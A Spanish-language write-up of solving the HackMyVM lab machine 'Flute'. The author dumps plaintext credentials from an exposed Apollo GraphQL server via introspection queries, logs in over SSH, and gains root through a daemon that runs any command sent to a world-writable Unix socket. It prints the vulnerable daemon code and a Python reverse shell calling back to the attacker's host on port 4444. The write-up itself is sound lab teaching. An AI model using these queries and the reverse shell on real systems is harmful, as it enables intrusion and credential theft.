---
title: "Flute HackMyVm - Writeup"
date: 2026-05-10 12:00:00 -0400
categories: [Writeups, HackMyVm]
tags: [web, GraphQL, daemon-malicioso]
---

En esta publicación se relatará cómo se resolvió la máquina Flute de la plataforma HackMyVM, una máquina que expone un servidor Apollo GraphQL desde donde se extraen credenciales mediante una query de introspección, y cuya escalada de privilegios se logra abusando de un daemon local que ejecuta comandos arbitrarios como root a través de un socket Unix.

### Información General
- **IP:** 192.168.0.165
- **Hostname:** flute
- **Sistema Operativo:** Alpine
- **Kernel:** Linux

---

##### Notas
-
---

# Writeup

---

### Hosts discovery (descubrimiento de hosts)

![](/assets/img/Flute-img/1.png)

---

### Enumeración
```bash
# Nmap 7.98 scan initiated Wed Apr 15 11:58:57 2026 as: /usr/lib/nmap/nmap -p 22,8888 -sCV -sS -Pn -vvv -oN nmap.txt -oX nmap.xml 192.168.0.165
Nmap scan report for flute (192.168.0.165)
Host is up, received arp-response (0.00034s latency).
Scanned at 2026-04-15 11:58:58 -04 for 11s

PORT     STATE SERVICE         REASON         VERSION
22/tcp   open  ssh             syn-ack ttl 64 OpenSSH 10.0 (protocol 2.0)
8888/tcp open  sun-answerbook? syn-ack ttl 64
...
MAC Address: 08:00:27:74:53:F6 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 15 11:59:09 2026 -- 1 IP address (1 host up) scanned in 11.81 seconds
```

| Vector | Servicio (Puerto)     | Estado  | Qué permite                                                                                                                                                                                                     | Qué intentar        | Notas |
| ------ | --------------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- | ----- |
| 1      | ssh (22)              | Abierto | Acceso autenticado a la máquina                                                                                                                                                                                 | Buscar credenciales |       |
| 2      | sun-answerbook (8888) | Abierto | El puerto 8888, históricamente asociado a Sun AnswerBook (plataforma de documentación), hoy funciona mayormente como un puerto HTTP alternativo o de administración (TCP) para aplicaciones web y de desarrollo |                     |       |

#### Sun-answerbook (8888)

![](/assets/img/Flute-img/2.png)

Al momento de dirigirme hacia `http://192.168.0.165:8888` podemos identificar que esta corriendo un servicio *Apollo server*.
Apollo Server es un intermediario entre un esquema GraphQL y las fuentes de datos (como bases de datos o API REST). Ofrece una configuración sencilla, lo que facilita la conexión de API, la definición del esquema y la escritura de funciones de resolución.

---

### Explotación

Básicamente por detrás está corriendo GraphQL, lo que podemos hacer aquí es extraer toda la información con la ayuda de una query de introspección.
Para eso usé la query que se encuentra en [Hacktricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html) en el apartado de "Enumerate Database Schema via Introspection" dentro de la sección GraphQL, pero había que adaptar la query para este formato:

```bash
curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.0.165:8888/' \
  --data '{"query":"query { __typename }"}'
```

Así que le pedí a ChatGPT que lo adaptara, dándome esto:

```bash
curl --request POST \
--header 'content-type: application/json' \
--url 'http://192.168.0.165:8888/' \
--data '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}' | jq > schema.json
```

Al final añadí un `| jq > schema.json` para luego pasarlo a `GraphQL Voyager`, pero no me funcionó, así que le pasé la salida a `Claude` para que lo analizara y buscara cosas interesantes, reportándome lo siguiente:

![](/assets/img/Flute-img/3.png)

Ya con esto podemos volcar los usuarios y sus contraseñas de la siguiente forma:

```bash
❯ curl --request POST \
  --header 'content-type: application/json' \
  --url 'http://192.168.0.165:8888/' \
  --data '{"query":"{ users { username password } }"}' | jq
```

Dándonos la siguiente salida:

```json
{
  "data": {
    "users": [
      {
        "username": "admin",
        "password": "imtherealadmin"
      },
      {
        "username": "hamelin",
        "password": "comewithmerats"
      }
    ]
  }
}
```

Tenemos credenciales. Hay que recordar que como único vector de entrada hasta el momento es SSH, así que probaremos las credenciales para ver si conseguimos acceder al sistema:

![](/assets/img/Flute-img/4.png)

Pudimos acceder como el usuario `hamelin` y además conseguimos la primera flag:

![](/assets/img/Flute-img/5.png)

---

### Post Explotación

Buscando binarios con permisos SUID encontré esto:

![](/assets/img/Flute-img/6.png)

Pero necesitas ser root, supongo que los valida por el UID:

![](/assets/img/Flute-img/7.png)

Luego usé `pspy` para analizar procesos y me di cuenta de un script en Python que se estaba ejecutando con el UID 0 de root:

![](/assets/img/Flute-img/8.png)

---

### Escalada de privilegios

Esto es lo que dice el script:

```python
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)   
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

Es un **daemon local** que escucha en `/tmp/ratd.sock` y ejecuta cualquier comando que le envíes si empieza con `RUN`.
Solo necesitas hacer un `nc -U /tmp/ratd.sock` y escribir luego `RUN` seguido del comando.

Intenté enviarme una reverse shell de la forma convencional, pero de ninguna forma funcionó ya que la máquina estaba muy limitada, así que se me ocurrió hacer un script en `python3` que me enviara una reverse shell:

```python
import socket
import os
import pty

s = socket.socket()
s.connect(("192.168.0.131", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/sh")
```

Ya solo queda ejecutar el script a través del daemon y estar en modo escucha para recibir la shell:

![](/assets/img/Flute-img/9.png)

Finalmente pude conseguir ejecución de comando como root, maquina Pwned.
